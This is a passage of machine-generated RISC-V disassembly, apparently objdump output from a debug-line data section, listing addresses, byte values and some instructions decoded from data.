     a7c:	0501                	.2byte	0x501
     a7e:	0312                	.2byte	0x312
     a80:	0900                	.2byte	0x900
     a82:	000c                	.2byte	0xc
     a84:	0501                	.2byte	0x501
     a86:	0310                	.2byte	0x310
     a88:	0900                	.2byte	0x900
     a8a:	0004                	.2byte	0x4
     a8c:	0501                	.2byte	0x501
     a8e:	0305                	.2byte	0x305
     a90:	0900                	.2byte	0x900
     a92:	0004                	.2byte	0x4
     a94:	0501                	.2byte	0x501
     a96:	030c                	.2byte	0x30c
     a98:	0904                	.2byte	0x904
     a9a:	0040                	.2byte	0x40
     a9c:	0501                	.2byte	0x501
     a9e:	09010307          	.4byte	0x9010307
     aa2:	0008                	.2byte	0x8
     aa4:	0501                	.2byte	0x501
     aa6:	030c                	.2byte	0x30c
     aa8:	0904                	.2byte	0x904
     aaa:	0004                	.2byte	0x4
     aac:	0501                	.2byte	0x501
     aae:	09010307          	.4byte	0x9010307
     ab2:	0008                	.2byte	0x8
     ab4:	0501                	.2byte	0x501
     ab6:	0316                	.2byte	0x316
     ab8:	090c                	.2byte	0x90c
     aba:	0004                	.2byte	0x4
     abc:	0501                	.2byte	0x501
     abe:	031f 0901 0004      	.byte	0x1f, 0x03, 0x01, 0x09, 0x04, 0x00
     ac4:	0501                	.2byte	0x501
     ac6:	0324                	.2byte	0x324
     ac8:	0900                	.2byte	0x900
     aca:	001c                	.2byte	0x1c
     acc:	0501                	.2byte	0x501
     ace:	09000313          	li	t1,144
     ad2:	0008                	.2byte	0x8
     ad4:	0501                	.2byte	0x501
     ad6:	030e                	.2byte	0x30e
     ad8:	0901                	.2byte	0x901
     ada:	0008                	.2byte	0x8
     adc:	0501                	.2byte	0x501
     ade:	030c                	.2byte	0x30c
     ae0:	0900                	.2byte	0x900
     ae2:	0008                	.2byte	0x8
     ae4:	0301                	.2byte	0x301
     ae6:	0901                	.2byte	0x901
     ae8:	0004                	.2byte	0x4
     aea:	0501                	.2byte	0x501
     aec:	0016                	.2byte	0x16
     aee:	0402                	.2byte	0x402
     af0:	0301                	.2byte	0x301
     af2:	0900                	.2byte	0x900
     af4:	000c                	.2byte	0xc
     af6:	0501                	.2byte	0x501
     af8:	031d                	.2byte	0x31d
     afa:	097d                	.2byte	0x97d
     afc:	000c                	.2byte	0xc
     afe:	0501                	.2byte	0x501
     b00:	09010313          	add	t1,sp,144
     b04:	000c                	.2byte	0xc
     b06:	0501                	.2byte	0x501
     b08:	0311                	.2byte	0x311
     b0a:	0908                	.2byte	0x908
     b0c:	0004                	.2byte	0x4
     b0e:	0501                	.2byte	0x501
     b10:	09010307          	.4byte	0x9010307
     b14:	0014                	.2byte	0x14
     b16:	0501                	.2byte	0x501
     b18:	030a                	.2byte	0x30a
     b1a:	00040903          	lb	s2,0(s0)
     b1e:	0501                	.2byte	0x501
     b20:	0901030f          	.4byte	0x901030f
     b24:	000c                	.2byte	0xc
     b26:	0501                	.2byte	0x501
     b28:	09010307          	.4byte	0x9010307
     b2c:	0004                	.2byte	0x4
     b2e:	0501                	.2byte	0x501
     b30:	0903030f          	.4byte	0x903030f
     b34:	0004                	.2byte	0x4
     b36:	0501                	.2byte	0x501
     b38:	09010307          	.4byte	0x9010307
     b3c:	0008                	.2byte	0x8
     b3e:	0301                	.2byte	0x301
     b40:	00040973          	.4byte	0x40973
     b44:	0501                	.2byte	0x501
     b46:	030a                	.2byte	0x30a
     b48:	0910                	.2byte	0x910
     b4a:	0004                	.2byte	0x4
     b4c:	0501                	.2byte	0x501
     b4e:	0901030f          	.4byte	0x901030f
     b52:	000c                	.2byte	0xc
     b54:	0501                	.2byte	0x501
     b56:	0326                	.2byte	0x326
     b58:	0900                	.2byte	0x900
     b5a:	0008                	.2byte	0x8
     b5c:	0501                	.2byte	0x501
     b5e:	09010307          	.4byte	0x9010307
     b62:	0008                	.2byte	0x8
     b64:	0501                	.2byte	0x501
     b66:	030c                	.2byte	0x30c
     b68:	0904                	.2byte	0x904
     b6a:	0004                	.2byte	0x4
     b6c:	0501                	.2byte	0x501
     b6e:	09010307          	.4byte	0x9010307
     b72:	000c                	.2byte	0xc
     b74:	0301                	.2byte	0x301
     b76:	0904                	.2byte	0x904
     b78:	0004                	.2byte	0x4
     b7a:	0301                	.2byte	0x301
     b7c:	0901                	.2byte	0x901
     b7e:	0020                	.2byte	0x20
     b80:	0501                	.2byte	0x501
     b82:	030e                	.2byte	0x30e
     b84:	0904                	.2byte	0x904
     b86:	0004                	.2byte	0x4
     b88:	0501                	.2byte	0x501
     b8a:	030a                	.2byte	0x30a
     b8c:	0900                	.2byte	0x900
     b8e:	0010                	.2byte	0x10
     b90:	0501                	.2byte	0x501
     b92:	0901030b          	.4byte	0x901030b
     b96:	0004                	.2byte	0x4
     b98:	0501                	.2byte	0x501
     b9a:	030a                	.2byte	0x30a
     b9c:	0901                	.2byte	0x901
     b9e:	0008                	.2byte	0x8
     ba0:	0501                	.2byte	0x501
     ba2:	0015                	.2byte	0x15
     ba4:	0402                	.2byte	0x402
     ba6:	0301                	.2byte	0x301
     ba8:	0900                	.2byte	0x900
     baa:	000c                	.2byte	0xc
     bac:	0501                	.2byte	0x501
     bae:	0314                	.2byte	0x314
     bb0:	0901                	.2byte	0x901
     bb2:	0010                	.2byte	0x10
     bb4:	0501                	.2byte	0x501
     bb6:	09000317          	auipc	t1,0x9000
     bba:	0004                	.2byte	0x4
     bbc:	0501                	.2byte	0x501
     bbe:	0314                	.2byte	0x314
     bc0:	0900                	.2byte	0x900
     bc2:	0014                	.2byte	0x14
     bc4:	0501                	.2byte	0x501
     bc6:	0309                	.2byte	0x309
     bc8:	0900                	.2byte	0x900
     bca:	0010                	.2byte	0x10
     bcc:	0501                	.2byte	0x501
     bce:	0402000b          	.4byte	0x402000b
     bd2:	09010303          	lb	t1,144(sp)
     bd6:	0004                	.2byte	0x4
     bd8:	0501                	.2byte	0x501
     bda:	003e                	.2byte	0x3e
     bdc:	0402                	.2byte	0x402
     bde:	097f0303          	lb	t1,151(t5)
     be2:	0018                	.2byte	0x18
     be4:	0501                	.2byte	0x501
     be6:	0034                	.2byte	0x34
     be8:	0402                	.2byte	0x402
     bea:	0301                	.2byte	0x301
     bec:	0900                	.2byte	0x900
     bee:	000c                	.2byte	0xc
     bf0:	0501                	.2byte	0x501
     bf2:	09020307          	.4byte	0x9020307
     bf6:	000c                	.2byte	0xc
     bf8:	0501                	.2byte	0x501
     bfa:	0009                	.2byte	0x9
     bfc:	0402                	.2byte	0x402
     bfe:	0305                	.2byte	0x305
     c00:	0901                	.2byte	0x901
     c02:	0004                	.2byte	0x4
     c04:	0501                	.2byte	0x501
     c06:	000a                	.2byte	0xa
     c08:	0402                	.2byte	0x402
     c0a:	0305                	.2byte	0x305
     c0c:	0901                	.2byte	0x901
     c0e:	0010                	.2byte	0x10
     c10:	0501                	.2byte	0x501
     c12:	004d                	.2byte	0x4d
     c14:	0402                	.2byte	0x402
     c16:	0305                	.2byte	0x305
     c18:	097e                	.2byte	0x97e
     c1a:	0004                	.2byte	0x4
     c1c:	0501                	.2byte	0x501
     c1e:	0014                	.2byte	0x14
     c20:	0402                	.2byte	0x402
     c22:	0301                	.2byte	0x301
     c24:	0900                	.2byte	0x900
     c26:	000c                	.2byte	0xc
     c28:	0501                	.2byte	0x501
     c2a:	0012                	.2byte	0x12
     c2c:	0402                	.2byte	0x402
     c2e:	0301                	.2byte	0x301
     c30:	0900                	.2byte	0x900
     c32:	0004                	.2byte	0x4
     c34:	0501                	.2byte	0x501
     c36:	0020                	.2byte	0x20
     c38:	0402                	.2byte	0x402
     c3a:	0301                	.2byte	0x301
     c3c:	0900                	.2byte	0x900
     c3e:	0004                	.2byte	0x4
     c40:	0001                	.2byte	0x1
     c42:	0402                	.2byte	0x402
     c44:	0602                	.2byte	0x602
     c46:	04090003          	lb	zero,64(s2)
     c4a:	0100                	.2byte	0x100
     c4c:	3205                	.2byte	0x3205
     c4e:	0200                	.2byte	0x200
     c50:	0404                	.2byte	0x404
     c52:	0306                	.2byte	0x306
     c54:	0900                	.2byte	0x900
     c56:	000c                	.2byte	0xc
     c58:	0501                	.2byte	0x501
     c5a:	09040307          	.4byte	0x9040307
     c5e:	0018                	.2byte	0x18
     c60:	0501                	.2byte	0x501
     c62:	0009                	.2byte	0x9
     c64:	0402                	.2byte	0x402
     c66:	0302                	.2byte	0x302
     c68:	0901                	.2byte	0x901
     c6a:	0004                	.2byte	0x4
     c6c:	0501                	.2byte	0x501
     c6e:	001e                	.2byte	0x1e
     c70:	0402                	.2byte	0x402
     c72:	0302                	.2byte	0x302
     c74:	097f 0010 0501 0014 	.byte	0x7f, 0x09, 0x10, 0x00, 0x01, 0x05, 0x14, 0x00, 0x02, 0x04
     c7c:	0402 
     c7e:	0301                	.2byte	0x301
     c80:	0900                	.2byte	0x900
     c82:	000c                	.2byte	0xc
     c84:	0501                	.2byte	0x501
     c86:	09020307          	.4byte	0x9020307
     c8a:	000c                	.2byte	0xc
     c8c:	0501                	.2byte	0x501
     c8e:	030d                	.2byte	0x30d
     c90:	0904                	.2byte	0x904
     c92:	0004                	.2byte	0x4
     c94:	0501                	.2byte	0x501
     c96:	0900030b          	.4byte	0x900030b
     c9a:	0018                	.2byte	0x18
     c9c:	0301                	.2byte	0x301
     c9e:	0901                	.2byte	0x901
     ca0:	0004                	.2byte	0x4
     ca2:	0501                	.2byte	0x501
     ca4:	030a                	.2byte	0x30a
     ca6:	0900                	.2byte	0x900
     ca8:	0004                	.2byte	0x4
     caa:	0501                	.2byte	0x501
     cac:	0309                	.2byte	0x309
     cae:	0901                	.2byte	0x901
     cb0:	0004                	.2byte	0x4
     cb2:	0501                	.2byte	0x501
     cb4:	0310                	.2byte	0x310
     cb6:	0901                	.2byte	0x901
     cb8:	0010                	.2byte	0x10
     cba:	0501                	.2byte	0x501
     cbc:	0900030f          	.4byte	0x900030f
     cc0:	0004                	.2byte	0x4
     cc2:	0501                	.2byte	0x501
     cc4:	030d                	.2byte	0x30d
     cc6:	0900                	.2byte	0x900
     cc8:	0004                	.2byte	0x4
     cca:	0501                	.2byte	0x501
     ccc:	030c                	.2byte	0x30c
     cce:	0902                	.2byte	0x902
     cd0:	0004                	.2byte	0x4
     cd2:	0501                	.2byte	0x501
     cd4:	09010307          	.4byte	0x9010307
     cd8:	0008                	.2byte	0x8
     cda:	0501                	.2byte	0x501
     cdc:	030c                	.2byte	0x30c
     cde:	0904                	.2byte	0x904
     ce0:	0004                	.2byte	0x4
     ce2:	0501                	.2byte	0x501
     ce4:	09010307          	.4byte	0x9010307
     ce8:	0008                	.2byte	0x8
     cea:	0501                	.2byte	0x501
     cec:	030c                	.2byte	0x30c
     cee:	0905                	.2byte	0x905
     cf0:	0004                	.2byte	0x4
     cf2:	0501                	.2byte	0x501
     cf4:	09010307          	.4byte	0x9010307
     cf8:	0008                	.2byte	0x8
     cfa:	0501                	.2byte	0x501
     cfc:	030d                	.2byte	0x30d
     cfe:	0905                	.2byte	0x905
     d00:	0004                	.2byte	0x4
     d02:	0501                	.2byte	0x501
     d04:	09010307          	.4byte	0x9010307
     d08:	0008                	.2byte	0x8
     d0a:	0301                	.2byte	0x301
     d0c:	0901                	.2byte	0x901
     d0e:	0010                	.2byte	0x10
     d10:	0501                	.2byte	0x501
     d12:	030c                	.2byte	0x30c
     d14:	0905                	.2byte	0x905
     d16:	0010                	.2byte	0x10
     d18:	0501                	.2byte	0x501
     d1a:	030d                	.2byte	0x30d
     d1c:	0902                	.2byte	0x902
     d1e:	0008                	.2byte	0x8
     d20:	0501                	.2byte	0x501
     d22:	09020307          	.4byte	0x9020307
     d26:	0018                	.2byte	0x18
     d28:	0301                	.2byte	0x301
     d2a:	0901                	.2byte	0x901
     d2c:	0020                	.2byte	0x20
     d2e:	0301                	.2byte	0x301
     d30:	0904                	.2byte	0x904
     d32:	0004                	.2byte	0x4
     d34:	0301                	.2byte	0x301
     d36:	0901                	.2byte	0x901
     d38:	0010                	.2byte	0x10
     d3a:	0301                	.2byte	0x301
     d3c:	0904                	.2byte	0x904
     d3e:	0004                	.2byte	0x4
     d40:	0501                	.2byte	0x501
     d42:	0901030b          	.4byte	0x901030b
     d46:	0010                	.2byte	0x10
     d48:	0501                	.2byte	0x501
     d4a:	09010307          	.4byte	0x9010307
     d4e:	0008                	.2byte	0x8
     d50:	0501                	.2byte	0x501
     d52:	0402000b          	.4byte	0x402000b
     d56:	0301                	.2byte	0x301
     d58:	7ef8                	.2byte	0x7ef8
     d5a:	0409                	.2byte	0x409
     d5c:	0100                	.2byte	0x100
     d5e:	0905                	.2byte	0x905
     d60:	04090203          	lb	tp,64(s2)
     d64:	0100                	.2byte	0x100
     d66:	0105                	.2byte	0x105
     d68:	09018903          	lb	s2,144(gp)
     d6c:	0004                	.2byte	0x4
     d6e:	0301                	.2byte	0x301
     d70:	00180903          	lb	s2,1(a6)
     d74:	0501                	.2byte	0x501
     d76:	09020303          	lb	t1,144(tp) # 90 <threadsense.2+0xc>
     d7a:	0030                	.2byte	0x30
     d7c:	0301                	.2byte	0x301
     d7e:	0902                	.2byte	0x902
     d80:	0014                	.2byte	0x14
     d82:	0501                	.2byte	0x501
     d84:	030a                	.2byte	0x30a
     d86:	001c0903          	lb	s2,1(s8)
     d8a:	0501                	.2byte	0x501
     d8c:	0301                	.2byte	0x301
     d8e:	0901                	.2byte	0x901
     d90:	0004                	.2byte	0x4
     d92:	0501                	.2byte	0x501
     d94:	09090303          	lb	t1,144(s2)
     d98:	0014                	.2byte	0x14
     d9a:	0501                	.2byte	0x501
     d9c:	030c                	.2byte	0x30c
     d9e:	0901                	.2byte	0x901
     da0:	001c                	.2byte	0x1c
     da2:	0501                	.2byte	0x501
     da4:	0306                	.2byte	0x306
     da6:	0901                	.2byte	0x901
     da8:	0008                	.2byte	0x8
     daa:	0501                	.2byte	0x501
     dac:	030c                	.2byte	0x30c
     dae:	0900                	.2byte	0x900
     db0:	0008                	.2byte	0x8
     db2:	0501                	.2byte	0x501
     db4:	0306                	.2byte	0x306
     db6:	0901                	.2byte	0x901
     db8:	000c                	.2byte	0xc
     dba:	0501                	.2byte	0x501
     dbc:	030c                	.2byte	0x30c
     dbe:	0900                	.2byte	0x900
     dc0:	0008                	.2byte	0x8
     dc2:	0501                	.2byte	0x501
     dc4:	09010303          	lb	t1,144(sp)
     dc8:	000c                	.2byte	0xc
     dca:	0501                	.2byte	0x501
     dcc:	0301                	.2byte	0x301
     dce:	0976                	.2byte	0x976
     dd0:	0010                	.2byte	0x10
     dd2:	0401                	.2byte	0x401
     dd4:	03050503          	lb	a0,48(a0)
     dd8:	7fbc                	.2byte	0x7fbc
     dda:	3009                	.2byte	0x3009
     ddc:	0100                	.2byte	0x100
     dde:	0204                	.2byte	0x204
     de0:	0905                	.2byte	0x905
     de2:	0900c603          	lbu	a2,144(ra)
     de6:	0058                	.2byte	0x58
     de8:	0501                	.2byte	0x501
     dea:	09010303          	lb	t1,144(sp)
     dee:	0008                	.2byte	0x8
     df0:	0301                	.2byte	0x301
     df2:	0909                	.2byte	0x909
     df4:	0014                	.2byte	0x14
     df6:	0301                	.2byte	0x301
     df8:	0901                	.2byte	0x901
     dfa:	0020                	.2byte	0x20
     dfc:	0501                	.2byte	0x501
     dfe:	0308                	.2byte	0x308
     e00:	0900                	.2byte	0x900
     e02:	0004                	.2byte	0x4
     e04:	0501                	.2byte	0x501
     e06:	030e                	.2byte	0x30e
     e08:	00040903          	lb	s2,0(s0)
     e0c:	0501                	.2byte	0x501
     e0e:	0301                	.2byte	0x301
     e10:	0901                	.2byte	0x901
     e12:	0010                	.2byte	0x10
     e14:	0301                	.2byte	0x301
     e16:	00140903          	lb	s2,1(s0)
     e1a:	0501                	.2byte	0x501
     e1c:	0309                	.2byte	0x309
     e1e:	0901                	.2byte	0x901
     e20:	0018                	.2byte	0x18
     e22:	0501                	.2byte	0x501
     e24:	0900031b          	addw	t1,zero,144
     e28:	0004                	.2byte	0x4
     e2a:	0501                	.2byte	0x501
     e2c:	0319                	.2byte	0x319
     e2e:	0900                	.2byte	0x900
     e30:	0004                	.2byte	0x4
     e32:	0501                	.2byte	0x501
     e34:	032a                	.2byte	0x32a
     e36:	0900                	.2byte	0x900
     e38:	0004                	.2byte	0x4
     e3a:	0501                	.2byte	0x501
     e3c:	0331                	.2byte	0x331
     e3e:	0900                	.2byte	0x900
     e40:	0008                	.2byte	0x8
     e42:	0501                	.2byte	0x501
     e44:	0306                	.2byte	0x306
     e46:	0900                	.2byte	0x900
     e48:	0004                	.2byte	0x4
     e4a:	0501                	.2byte	0x501
     e4c:	0316                	.2byte	0x316
     e4e:	0901                	.2byte	0x901
     e50:	0004                	.2byte	0x4
     e52:	0501                	.2byte	0x501
     e54:	0310                	.2byte	0x310
     e56:	0901                	.2byte	0x901
     e58:	0008                	.2byte	0x8
     e5a:	0501                	.2byte	0x501
     e5c:	0901030b          	.4byte	0x901030b
     e60:	0008                	.2byte	0x8
     e62:	0501                	.2byte	0x501
     e64:	0310                	.2byte	0x310
     e66:	0901                	.2byte	0x901
     e68:	0004                	.2byte	0x4
     e6a:	0501                	.2byte	0x501
     e6c:	0309                	.2byte	0x309
     e6e:	0900                	.2byte	0x900
     e70:	000c                	.2byte	0xc
     e72:	0501                	.2byte	0x501
     e74:	030e                	.2byte	0x30e
     e76:	0900                	.2byte	0x900
     e78:	000c                	.2byte	0xc
     e7a:	0501                	.2byte	0x501
     e7c:	030c                	.2byte	0x30c
     e7e:	0900                	.2byte	0x900
     e80:	0004                	.2byte	0x4
     e82:	0501                	.2byte	0x501
     e84:	0322                	.2byte	0x322
     e86:	097f 0004 0501 030e 	.byte	0x7f, 0x09, 0x04, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     e8e:	0900 
     e90:	000c                	.2byte	0xc
     e92:	0501                	.2byte	0x501
     e94:	0311                	.2byte	0x311
     e96:	000c0903          	lb	s2,0(s8)
     e9a:	0501                	.2byte	0x501
     e9c:	0901030b          	.4byte	0x901030b
     ea0:	0008                	.2byte	0x8
     ea2:	0301                	.2byte	0x301
     ea4:	0901                	.2byte	0x901
     ea6:	0008                	.2byte	0x8
     ea8:	0501                	.2byte	0x501
     eaa:	0310                	.2byte	0x310
     eac:	0901                	.2byte	0x901
     eae:	0004                	.2byte	0x4
     eb0:	0501                	.2byte	0x501
     eb2:	0309                	.2byte	0x309
     eb4:	0900                	.2byte	0x900
     eb6:	000c                	.2byte	0xc
     eb8:	0501                	.2byte	0x501
     eba:	030e                	.2byte	0x30e
     ebc:	0900                	.2byte	0x900
     ebe:	000c                	.2byte	0xc
     ec0:	0501                	.2byte	0x501
     ec2:	030c                	.2byte	0x30c
     ec4:	0900                	.2byte	0x900
     ec6:	0004                	.2byte	0x4
     ec8:	0501                	.2byte	0x501
     eca:	031d                	.2byte	0x31d
     ecc:	097f 0004 0501 030e 	.byte	0x7f, 0x09, 0x04, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     ed4:	0900 
     ed6:	000c                	.2byte	0xc
     ed8:	0501                	.2byte	0x501
     eda:	030a                	.2byte	0x30a
     edc:	00080903          	lb	s2,0(a6)
     ee0:	0501                	.2byte	0x501
     ee2:	0301                	.2byte	0x301
     ee4:	0901                	.2byte	0x901
     ee6:	0004                	.2byte	0x4
     ee8:	0301                	.2byte	0x301
     eea:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     eee:	0501                	.2byte	0x501
     ef0:	0309                	.2byte	0x309
     ef2:	0901                	.2byte	0x901
     ef4:	001c                	.2byte	0x1c
     ef6:	0501                	.2byte	0x501
     ef8:	0319                	.2byte	0x319
     efa:	0900                	.2byte	0x900
     efc:	0004                	.2byte	0x4
     efe:	0501                	.2byte	0x501
     f00:	0320                	.2byte	0x320
     f02:	0900                	.2byte	0x900
     f04:	0008                	.2byte	0x8
     f06:	0501                	.2byte	0x501
     f08:	0306                	.2byte	0x306
     f0a:	0900                	.2byte	0x900
     f0c:	0004                	.2byte	0x4
     f0e:	0501                	.2byte	0x501
     f10:	0901031b          	addw	t1,sp,144
     f14:	0004                	.2byte	0x4
     f16:	0501                	.2byte	0x501
     f18:	0900030f          	.4byte	0x900030f
     f1c:	0004                	.2byte	0x4
     f1e:	0501                	.2byte	0x501
     f20:	0312                	.2byte	0x312
     f22:	0901                	.2byte	0x901
     f24:	0008                	.2byte	0x8
     f26:	0501                	.2byte	0x501
     f28:	030a                	.2byte	0x30a
     f2a:	0900                	.2byte	0x900
     f2c:	0008                	.2byte	0x8
     f2e:	0501                	.2byte	0x501
     f30:	0312                	.2byte	0x312
     f32:	0901                	.2byte	0x901
     f34:	000c                	.2byte	0xc
     f36:	0501                	.2byte	0x501
     f38:	030a                	.2byte	0x30a
     f3a:	0900                	.2byte	0x900
     f3c:	0008                	.2byte	0x8
     f3e:	0501                	.2byte	0x501
     f40:	0318                	.2byte	0x318
     f42:	0901                	.2byte	0x901
     f44:	000c                	.2byte	0xc
     f46:	0501                	.2byte	0x501
     f48:	030a                	.2byte	0x30a
     f4a:	0900                	.2byte	0x900
     f4c:	0008                	.2byte	0x8
     f4e:	0501                	.2byte	0x501
     f50:	0310                	.2byte	0x310
     f52:	0902                	.2byte	0x902
     f54:	000c                	.2byte	0xc
     f56:	0501                	.2byte	0x501
     f58:	0901030b          	.4byte	0x901030b
     f5c:	0008                	.2byte	0x8
     f5e:	0501                	.2byte	0x501
     f60:	0309                	.2byte	0x309
     f62:	0901                	.2byte	0x901
     f64:	0004                	.2byte	0x4
     f66:	0501                	.2byte	0x501
     f68:	030c                	.2byte	0x30c
     f6a:	0900                	.2byte	0x900
     f6c:	000c                	.2byte	0xc
     f6e:	0501                	.2byte	0x501
     f70:	0322                	.2byte	0x322
     f72:	097f 0008 0501 030e 	.byte	0x7f, 0x09, 0x08, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     f7a:	0900 
     f7c:	000c                	.2byte	0xc
     f7e:	0501                	.2byte	0x501
     f80:	0903030b          	.4byte	0x903030b
     f84:	000c                	.2byte	0xc
     f86:	0301                	.2byte	0x301
     f88:	0901                	.2byte	0x901
     f8a:	0008                	.2byte	0x8
     f8c:	0501                	.2byte	0x501
     f8e:	0309                	.2byte	0x309
     f90:	0901                	.2byte	0x901
     f92:	0004                	.2byte	0x4
     f94:	0501                	.2byte	0x501
     f96:	030c                	.2byte	0x30c
     f98:	0900                	.2byte	0x900
     f9a:	000c                	.2byte	0xc
     f9c:	0501                	.2byte	0x501
     f9e:	031d                	.2byte	0x31d
     fa0:	097f 000c 0501 030e 	.byte	0x7f, 0x09, 0x0c, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     fa8:	0900 
     faa:	000c                	.2byte	0xc
     fac:	0501                	.2byte	0x501
     fae:	030a                	.2byte	0x30a
     fb0:	00080903          	lb	s2,0(a6)
     fb4:	0501                	.2byte	0x501
     fb6:	0301                	.2byte	0x301
     fb8:	0901                	.2byte	0x901
     fba:	0004                	.2byte	0x4
     fbc:	0301                	.2byte	0x301
     fbe:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     fc2:	0501                	.2byte	0x501
     fc4:	0901030f          	.4byte	0x901030f
     fc8:	0010                	.2byte	0x10
     fca:	0501                	.2byte	0x501
     fcc:	0309                	.2byte	0x309
     fce:	0901                	.2byte	0x901
     fd0:	0008                	.2byte	0x8
     fd2:	0501                	.2byte	0x501
     fd4:	0306                	.2byte	0x306
     fd6:	0901                	.2byte	0x901
     fd8:	0004                	.2byte	0x4
     fda:	0501                	.2byte	0x501
     fdc:	030a                	.2byte	0x30a
     fde:	097f 000c 0501 030c 	.byte	0x7f, 0x09, 0x0c, 0x00, 0x01, 0x05, 0x0c, 0x03, 0x02, 0x09
     fe6:	0902 
     fe8:	000c                	.2byte	0xc
     fea:	0501                	.2byte	0x501
     fec:	0301                	.2byte	0x301
     fee:	0901                	.2byte	0x901
     ff0:	000c                	.2byte	0xc
     ff2:	0301                	.2byte	0x301
     ff4:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     ff8:	0501                	.2byte	0x501
     ffa:	0901030f          	.4byte	0x901030f
     ffe:	0014                	.2byte	0x14
    1000:	0501                	.2byte	0x501
    1002:	0309                	.2byte	0x309
    1004:	0901                	.2byte	0x901
    1006:	0008                	.2byte	0x8
    1008:	0501                	.2byte	0x501
    100a:	0306                	.2byte	0x306
    100c:	0901                	.2byte	0x901
    100e:	0004                	.2byte	0x4
    1010:	0501                	.2byte	0x501
    1012:	097f030b          	.4byte	0x97f030b
    1016:	000c                	.2byte	0xc
    1018:	0501                	.2byte	0x501
    101a:	030e                	.2byte	0x30e
    101c:	0900                	.2byte	0x900
    101e:	000c                	.2byte	0xc
    1020:	0501                	.2byte	0x501
    1022:	0011                	.2byte	0x11
    1024:	0402                	.2byte	0x402
    1026:	0301                	.2byte	0x301
    1028:	0900                	.2byte	0x900
    102a:	0004                	.2byte	0x4
    102c:	0501                	.2byte	0x501
    102e:	000e                	.2byte	0xe
    1030:	0402                	.2byte	0x402
    1032:	0301                	.2byte	0x301
    1034:	0900                	.2byte	0x900
    1036:	0008                	.2byte	0x8
    1038:	0501                	.2byte	0x501
    103a:	030c                	.2byte	0x30c
    103c:	0902                	.2byte	0x902
    103e:	0004                	.2byte	0x4
    1040:	0501                	.2byte	0x501
    1042:	0301                	.2byte	0x301
    1044:	0901                	.2byte	0x901
    1046:	000c                	.2byte	0xc
    1048:	0301                	.2byte	0x301
    104a:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    104e:	0501                	.2byte	0x501
    1050:	000d                	.2byte	0xd
    1052:	0402                	.2byte	0x402
    1054:	0302                	.2byte	0x302
    1056:	0904                	.2byte	0x904
    1058:	0014                	.2byte	0x14
    105a:	0501                	.2byte	0x501
    105c:	0008                	.2byte	0x8
    105e:	0402                	.2byte	0x402
    1060:	0302                	.2byte	0x302
    1062:	0900                	.2byte	0x900
    1064:	000c                	.2byte	0xc
    1066:	0501                	.2byte	0x501
    1068:	000d                	.2byte	0xd
    106a:	0402                	.2byte	0x402
    106c:	0302                	.2byte	0x302
    106e:	0901                	.2byte	0x901
    1070:	0008                	.2byte	0x8
    1072:	0501                	.2byte	0x501
    1074:	0008                	.2byte	0x8
    1076:	0402                	.2byte	0x402
    1078:	0302                	.2byte	0x302
    107a:	0900                	.2byte	0x900
    107c:	000c                	.2byte	0xc
    107e:	0501                	.2byte	0x501
    1080:	0014                	.2byte	0x14
    1082:	0402                	.2byte	0x402
    1084:	0302                	.2byte	0x302
    1086:	0901                	.2byte	0x901
    1088:	0008                	.2byte	0x8
    108a:	0001                	.2byte	0x1
    108c:	0402                	.2byte	0x402
    108e:	0601                	.2byte	0x601
    1090:	0c090003          	lb	zero,192(s2)
    1094:	0100                	.2byte	0x100
    1096:	0d05                	.2byte	0xd05
    1098:	0306                	.2byte	0x306
    109a:	0902                	.2byte	0x902
    109c:	0018                	.2byte	0x18
    109e:	0501                	.2byte	0x501
    10a0:	0301                	.2byte	0x301
    10a2:	0901                	.2byte	0x901
    10a4:	0018                	.2byte	0x18
    10a6:	0301                	.2byte	0x301
    10a8:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    10ac:	0501                	.2byte	0x501
    10ae:	0309                	.2byte	0x309
    10b0:	0901                	.2byte	0x901
    10b2:	0014                	.2byte	0x14
    10b4:	0301                	.2byte	0x301
    10b6:	0901                	.2byte	0x901
    10b8:	0008                	.2byte	0x8
    10ba:	0501                	.2byte	0x501
    10bc:	0016                	.2byte	0x16
    10be:	0402                	.2byte	0x402
    10c0:	0301                	.2byte	0x301
    10c2:	0900                	.2byte	0x900
    10c4:	0004                	.2byte	0x4
    10c6:	0501                	.2byte	0x501
    10c8:	000d                	.2byte	0xd
    10ca:	0402                	.2byte	0x402
    10cc:	0301                	.2byte	0x301
    10ce:	0900                	.2byte	0x900
    10d0:	000c                	.2byte	0xc
    10d2:	0501                	.2byte	0x501
    10d4:	0012                	.2byte	0x12
    10d6:	0402                	.2byte	0x402
    10d8:	0301                	.2byte	0x301
    10da:	0900                	.2byte	0x900
    10dc:	000c                	.2byte	0xc
    10de:	0501                	.2byte	0x501
    10e0:	0010                	.2byte	0x10
    10e2:	0402                	.2byte	0x402
    10e4:	0301                	.2byte	0x301
    10e6:	0900                	.2byte	0x900
    10e8:	0004                	.2byte	0x4
    10ea:	0501                	.2byte	0x501
    10ec:	0402000b          	.4byte	0x402000b
    10f0:	0301                	.2byte	0x301
    10f2:	0900                	.2byte	0x900
    10f4:	0004                	.2byte	0x4
    10f6:	0501                	.2byte	0x501
    10f8:	000a                	.2byte	0xa
    10fa:	0402                	.2byte	0x402
    10fc:	0301                	.2byte	0x301
    10fe:	0900                	.2byte	0x900
    1100:	0004                	.2byte	0x4
    1102:	0301                	.2byte	0x301
    1104:	0902                	.2byte	0x902
    1106:	0004                	.2byte	0x4
    1108:	0501                	.2byte	0x501
    110a:	0301                	.2byte	0x301
    110c:	0901                	.2byte	0x901
    110e:	0004                	.2byte	0x4
    1110:	0301                	.2byte	0x301
    1112:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    1116:	0501                	.2byte	0x501
    1118:	0308                	.2byte	0x308
    111a:	0901                	.2byte	0x901
    111c:	0010                	.2byte	0x10
    111e:	0501                	.2byte	0x501
    1120:	09010307          	.4byte	0x9010307
    1124:	0004                	.2byte	0x4
    1126:	0501                	.2byte	0x501
    1128:	0309                	.2byte	0x309
    112a:	0902                	.2byte	0x902
    112c:	0004                	.2byte	0x4
    112e:	0501                	.2byte	0x501
    1130:	0308                	.2byte	0x308
    1132:	0901                	.2byte	0x901
